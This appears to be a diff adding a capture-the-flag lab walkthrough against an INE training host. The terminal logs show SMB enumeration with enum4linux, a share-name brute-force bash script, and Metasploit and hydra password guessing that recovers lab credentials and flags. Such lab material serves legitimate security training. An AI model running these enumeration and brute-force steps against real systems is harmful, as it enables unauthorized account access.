@@ -53,3 +53,452 @@ msf6 auxiliary(scanner/smb/smb_enumusers) > exploit
   [+] 192.187.31.3:445 - Builtin [  ] ( LockoutTries=0 PasswordMin=5 )
   [*] target.ine.local:445 - Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
+
+┌──(root㉿INE)-[~]
+└─# enum4linux target.ine.local                                                                                                                            
+Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Apr 30 17:24:21 2025
+
+ =========================================( Target Information )=========================================
+                                                                                                                                                           
+Target ........... target.ine.local                                                                                                                        
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==========================( Enumerating Workgroup/Domain on target.ine.local )==========================
+                                                                                                                                                           
+                                                                                                                                                           
+[+] Got domain/workgroup name: WORKGROUP                                                                                                                   
+                                                                                                                                                           
+                                                                                                                                                           
+ ==============================( Nbtstat Information for target.ine.local )==============================
+                                                                                                                                                           
+Looking up status of 192.159.8.3                                                                                                                           
+        TARGET          <00> -         B <ACTIVE>  Workstation Service
+        TARGET          <03> -         B <ACTIVE>  Messenger Service
+        TARGET          <20> -         B <ACTIVE>  File Server Service
+        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+
+        MAC Address = 00-00-00-00-00-00
+
+ =================================( Session Check on target.ine.local )=================================
+                                                                                                                                                           
+                                                                                                                                                           
+[+] Server target.ine.local allows sessions using username '', password ''                                                                                 
+                                                                                                                                                           
+                                                                                                                                                           
+ ==============================( Getting domain SID for target.ine.local )==============================
+                                                                                                                                                           
+Domain Name: WORKGROUP                                                                                                                                     
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup                                                                                       
+                                                                                                                                                           
+                                                                                                                                                           
+ =================================( OS information on target.ine.local )=================================
+                                                                                                                                                           
+                                                                                                                                                           
+[E] Can't get OS info with smbclient                                                                                                                       
+                                                                                                                                                           
+                                                                                                                                                           
+[+] Got OS info for target.ine.local from srvinfo:                                                                                                         
+        TARGET         Wk Sv PrQ Unx NT SNT target server (Samba, Ubuntu)                                                                                  
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+
+
+ =====================================( Users on target.ine.local )=====================================
+                                                                                                                                                           
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: josh     Name:   Desc:                                                                                      
+index: 0x2 RID: 0x3ea acb: 0x00000010 Account: nancy    Name:   Desc: 
+index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: bob      Name:   Desc: 
+
+user:[josh] rid:[0x3e8]
+user:[nancy] rid:[0x3ea]
+user:[bob] rid:[0x3e9]
+
+ ===============================( Share Enumeration on target.ine.local )===============================
+                                                                                                                                                           
+smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                      
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        IPC$            IPC       IPC Service (target server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+Protocol negotiation to server target.ine.local (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
+Unable to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on target.ine.local                                                                                                           
+                                                                                                                                                           
+//target.ine.local/print$       Mapping: DENIED Listing: N/A Writing: N/A                                                                                  
+
+[E] Can't understand response:                                                                                                                             
+                                                                                                                                                           
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                 
+//target.ine.local/IPC$ Mapping: N/A Listing: N/A Writing: N/A
+
+ ==========================( Password Policy Information for target.ine.local )==========================
+                                                                                                                                                           
+                                                                                                                                                           
+
+[+] Attaching to target.ine.local using a NULL share
+
+[+] Trying protocol 139/SMB...
+
+[+] Found domain(s):
+
+        [+] TARGET
+        [+] Builtin
+
+[+] Password Info for Domain: TARGET
+
+        [+] Minimum password length: 5
+        [+] Password history length: None
+        [+] Maximum password age: 37 days 6 hours 21 minutes 
+        [+] Password Complexity Flags: 000000
+
+                [+] Domain Refuse Password Change: 0
+                [+] Domain Password Store Cleartext: 0
+                [+] Domain Password Lockout Admins: 0
+                [+] Domain Password No Clear Change: 0
+                [+] Domain Password No Anon Change: 0
+                [+] Domain Password Complex: 0
+
+        [+] Minimum password age: None
+        [+] Reset Account Lockout Counter: 30 minutes 
+        [+] Locked Account Duration: 30 minutes 
+        [+] Account Lockout Threshold: None
+        [+] Forced Log off Time: 37 days 6 hours 21 minutes 
+
+
+
+[+] Retieved partial password policy with rpcclient:                                                                                                       
+                                                                                                                                                           
+                                                                                                                                                           
+Password Complexity: Disabled                                                                                                                              
+Minimum Password Length: 5
+
+
+ =====================================( Groups on target.ine.local )=====================================
+                                                                                                                                                           
+                                                                                                                                                           
+[+] Getting builtin groups:                                                                                                                                
+                                                                                                                                                           
+                                                                                                                                                           
+[+]  Getting builtin group memberships:                                                                                                                    
+                                                                                                                                                           
+                                                                                                                                                           
+[+]  Getting local groups:                                                                                                                                 
+                                                                                                                                                           
+                                                                                                                                                           
+[+]  Getting local group memberships:                                                                                                                      
+                                                                                                                                                           
+                                                                                                                                                           
+[+]  Getting domain groups:                                                                                                                                
+                                                                                                                                                           
+                                                                                                                                                           
+[+]  Getting domain group memberships:                                                                                                                     
+                                                                                                                                                           
+                                                                                                                                                           
+ ================( Users on target.ine.local via RID cycling (RIDS: 500-550,1000-1050) )================
+                                                                                                                                                           
+                                                                                                                                                           
+[I] Found new SID:                                                                                                                                         
+S-1-22-1                                                                                                                                                   
+
+[I] Found new SID:                                                                                                                                         
+S-1-5-32                                                                                                                                                   
+
+[I] Found new SID:                                                                                                                                         
+S-1-5-32                                                                                                                                                   
+
+[I] Found new SID:                                                                                                                                         
+S-1-5-32                                                                                                                                                   
+
+[I] Found new SID:                                                                                                                                         
+S-1-5-32                                                                                                                                                   
+
+[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                
+                                                                                                                                                           
+S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                          
+S-1-5-32-545 BUILTIN\Users (Local Group)
+S-1-5-32-546 BUILTIN\Guests (Local Group)
+S-1-5-32-547 BUILTIN\Power Users (Local Group)
+S-1-5-32-548 BUILTIN\Account Operators (Local Group)
+S-1-5-32-549 BUILTIN\Server Operators (Local Group)
+S-1-5-32-550 BUILTIN\Print Operators (Local Group)
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                
+                                                                                                                                                           
+S-1-22-1-1000 Unix User\josh (Local User)                                                                                                                  
+S-1-22-1-1001 Unix User\bob (Local User)
+S-1-22-1-1002 Unix User\nancy (Local User)
+S-1-22-1-1003 Unix User\alice (Local User)
+
+[+] Enumerating users using SID S-1-5-21-2772146348-925366189-852203956 and logon username '', password ''                                                 
+                                                                                                                                                           
+S-1-5-21-2772146348-925366189-852203956-501 TARGET\nobody (Local User)                                                                                     
+S-1-5-21-2772146348-925366189-852203956-513 TARGET\None (Domain Group)
+S-1-5-21-2772146348-925366189-852203956-1000 TARGET\josh (Local User)
+S-1-5-21-2772146348-925366189-852203956-1001 TARGET\bob (Local User)
+S-1-5-21-2772146348-925366189-852203956-1002 TARGET\nancy (Local User)
+
+ =============================( Getting printer info for target.ine.local )=============================
+                                                                                                                                                           
+No printers returned.                                                                                                                                      
+
+
+enum4linux complete on Wed Apr 30 17:24:41 2025
+
+
+
+Step 2:
+┌──(root㉿INE)-[~]
+└─# cat brute_dir.sh                                                                                                                                  
+  #!/bin/bash
+  TARGET="target.ine.local"
+  WORDLIST="/root/Desktop/wordlists/shares.txt"
+  
+  if [ ! -f "$WORDLIST" ]; then
+   echo "Wordlist file not exist"
+   exit 1
+  fi
+  
+  while read -r SHARE; do
+   echo "[*] PROBANDO LA COMPARTICION: $SHARE"
+   smbclient //$TARGET/$SHARE -N -c "ls" &>/dev/null
+  
+   if [ $? -eq 0 ]; then
+    echo "[+] Anonymous access allowed for: $SHARE"
+   else
+    echo "[-] Access denied for $SHARE"
+   fi
+  done < "$WORDLIST"
+
+┌──(root㉿INE)-[~]
+└─# chmod +x brute_dir.sh                                                                                                                                  
+
+┌──(root㉿INE)-[~]
+└─# ./brute_dir.sh                                                                                                                                  
+  [*] PROBANDO LA COMPARTICION: publicdata
+  [-] Access denied for publicdata
+  [*] PROBANDO LA COMPARTICION: communitydata
+  [-] Access denied for communitydata
+  [*] PROBANDO LA COMPARTICION: openstorage
+  [-] Access denied for openstorage
+  [*] PROBANDO LA COMPARTICION: freestorage
+  [-] Access denied for freestorage
+  [*] PROBANDO LA COMPARTICION: accessiblestorage
+  [-] Access denied for accessiblestorage
+  [*] PROBANDO LA COMPARTICION: pubstorage
+  [-] Access denied for pubstorage
+  [*] PROBANDO LA COMPARTICION: commonstorage
+  [-] Access denied for commonstorage
+  [*] PROBANDO LA COMPARTICION: publicarchive
+  [-] Access denied for publicarchive
+  [*] PROBANDO LA COMPARTICION: sharedarchive
+  [-] Access denied for sharedarchive
+  [*] PROBANDO LA COMPARTICION: commonarchive
+  [-] Access denied for commonarchive
+  [*] PROBANDO LA COMPARTICION: pubarchive
+  [-] Access denied for pubarchive
+  [*] PROBANDO LA COMPARTICION: opendocs
+  [-] Access denied for opendocs
+  [*] PROBANDO LA COMPARTICION: freedocs
+  [-] Access denied for freedocs
+  [*] PROBANDO LA COMPARTICION: communitydocs
+  [-] Access denied for communitydocs
+  [*] PROBANDO LA COMPARTICION: accessibledocs
+  [-] Access denied for accessibledocs
+  [*] PROBANDO LA COMPARTICION: commondocs
+  [-] Access denied for commondocs
+  [*] PROBANDO LA COMPARTICION: pubdocs
+  [-] Access denied for pubdocs
+  [*] PROBANDO LA COMPARTICION: publicfiles
+  [-] Access denied for publicfiles
+  [*] PROBANDO LA COMPARTICION: openfiles
+  [-] Access denied for openfiles
+  [*] PROBANDO LA COMPARTICION: freefiles
+  [-] Access denied for freefiles
+  [*] PROBANDO LA COMPARTICION: sharedfiles
+  [-] Access denied for sharedfiles
+  [*] PROBANDO LA COMPARTICION: accessiblefiles
+  [-] Access denied for accessiblefiles
+  [*] PROBANDO LA COMPARTICION: communityfiles
+  [-] Access denied for communityfiles
+  [*] PROBANDO LA COMPARTICION: commonsfiles
+  [-] Access denied for commonsfiles
+        [*] PROBANDO LA COMPARTICION: pubfiles
+        [+] Anonymous access allowed for: pubfiles
+  [*] PROBANDO LA COMPARTICION: openvault
+  [-] Access denied for openvault
+  [*] PROBANDO LA COMPARTICION: freevault
+  [-] Access denied for freevault
+  [*] PROBANDO LA COMPARTICION: accessiblevault
+  [-] Access denied for accessiblevault
+  [*] PROBANDO LA COMPARTICION: publicvault
+  [-] Access denied for publicvault
+  [*] PROBANDO LA COMPARTICION: commonvault
+  [-] Access denied for commonvault
+  [*] PROBANDO LA COMPARTICION: openlibrary
+  [-] Access denied for openlibrary
+  [*] PROBANDO LA COMPARTICION: pubvault
+  [-] Access denied for pubvault
+  [*] PROBANDO LA COMPARTICION: freelibrary
+  [-] Access denied for freelibrary
+  [*] PROBANDO LA COMPARTICION: accessiblelibrary
+  [-] Access denied for accessiblelibrary
+  [*] PROBANDO LA COMPARTICION: worldstoragebin
+  [-] Access denied for worldstoragebin
+  [*] PROBANDO LA COMPARTICION: universalstoragebin
+  [-] Access denied for universalstoragebin
+  [*] PROBANDO LA COMPARTICION: sharedstoragebin
+  [-] Access denied for sharedstoragebin
+  [*] PROBANDO LA COMPARTICION: collectivestoragebin
+  [-] Access denied for collectivestoragebin
+  [*] PROBANDO LA COMPARTICION: mutualstoragebin
+  [-] Access denied for mutualstoragebin
+  [*] PROBANDO LA COMPARTICION: globalarchivebin
+  [-] Access denied for globalarchivebin
+  [*] PROBANDO LA COMPARTICION: worldarchivebin
+  [-] Access denied for worldarchivebin
+  [*] PROBANDO LA COMPARTICION: universalarchivebin
+  [-] Access denied for universalarchivebin
+
+┌──(root㉿INE)-[~]
+└─# smbclient //target.ine.local/pubfiles -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Apr 30 16:33:40 2025
+  ..                                  D        0  Tue Nov 19 10:44:41 2024
+  flag1.txt                           N       40  Wed Apr 30 16:33:40 2025
+
+                1981311780 blocks of size 1024. 84994572 blocks available
+smb: \> cat flag1.txt
+cat: command not found
+smb: \> get flag1.txt 
+getting file \flag1.txt of size 40 as flag1.txt (19.5 KiloBytes/sec) (average 19.5 KiloBytes/sec)
+smb: \> 
+
+Step 3:
+┌──(root㉿INE)-[~]
+└─# cat names.txt 
+  josh
+  nancy
+  bob
+msf6 auxiliary(scanner/smb/smb_login) > exploit
+
+[*] 192.159.8.3:445       - 192.159.8.3:445 - Starting SMB login bruteforce
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\josh:admin',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\josh:123456',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\josh:friends',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\josh:butterfly',
+  [+] 192.159.8.3:445       - 192.159.8.3:445 - Success: '.\josh:purple'
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:admin',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:123456',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:forever',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:family',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:jonathan',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:987654321',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:computer',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:whatever',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:dragon',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:vanessa',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:cookie',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:naruto',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:summer',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:sweety',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:spongebob',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:joseph',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:junior',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:softball',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:taylor',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:yellow',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:daniela',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:lauren',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:mickey',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:princesa',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:alexandra',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:alexis',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:jesus',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:estrella',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:miguel',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:william',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:thomas',
+[-] 192.159.8.3:445       - 192.159.8.3:445 - Failed: '.\nancy:beautiful',
+^C[*] target.ine.local:445  - Caught interrupt from the console...
+[-] target.ine.local:445  - Auxiliary failed: NoMethodError undefined method `flat_map' for nil:NilClass
+[-] target.ine.local:445  - Call stack:
+[-] target.ine.local:445  -   /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_login.rb:94:in `run'
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_login) > 
+
+┌──(root㉿INE)-[~]
+└─# smbclient //target.ine.local/josh -U josh                                                                                                              
+Password for [WORKGROUP\josh]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Apr 30 16:33:40 2025
+  ..                                  D        0  Tue Nov 19 10:44:41 2024
+  flag2.txt                           N      119  Wed Apr 30 16:33:40 2025
+
+                1981311780 blocks of size 1024. 84856308 blocks available
+smb: \> get flag2.txt 
+getting file \flag2.txt of size 119 as flag2.txt (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
+
+Step 4:
+┌──(root㉿INE)-[~]
+└─# ftp -p target.ine.local 5554
+Connected to target.ine.local.
+220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
+Name (target.ine.local:root): 
+
+┌──(root㉿INE)-[~]
+└─# hydra -L names.txt -P /root/Desktop/wordlist/unix_password.txt ftp://target.ine.local:5554
+[5554][ftp] host: target.ine.local   login: alice   password: pretty
+
+┌──(root㉿INE)-[~]
+└─# ftp -p target.ine.local 5554
+Connected to target.ine.local.
+220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
+Name (target.ine.local:root): alice
+password: pretty
+
+Step 5:
+┌──(root㉿INE)-[~]
+└─# ssh target.ine.local                                                                                                                                   
+  The authenticity of host 'target.ine.local (192.159.8.3)' can't be established.
+  ED25519 key fingerprint is SHA256:qWHJnmTFgrmLKFbmMNRLIr1Y8MVWpqGGxhJ5miFHgnQ.
+  This key is not known by any other names.
+  Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+  Warning: Permanently added 'target.ine.local' (ED25519) to the list of known hosts.
+  ********************************************************************
+  *                                                                  *
+  *            WARNING: Unauthorized access to this system           *
+  *            is strictly prohibited and may be subject to          *
+  *            criminal prosecution.                                 *
+  *                                                                  *
+  *            This system is for authorized users only.             *
+  *            All activities on this system are monitored           *
+  *            and recorded.                                         *
+  *                                                                  *
+  *            By accessing this system, you consent to              *
+  *            such monitoring and recording.                        *
+  *                                                                  *
+  *            If you are not an authorized user,                    *
+  *            disconnect immediately.                               *
+  *                                                                  *
+  ********************************************************************
+  *                                                                  *
+  *    Is this what you're looking for?: FLAG4{46711a51348c416da76eb361eaea09d1}       *
+  *                                                                  *
+  ********************************************************************
+  root@target.ine.local's password: 
+
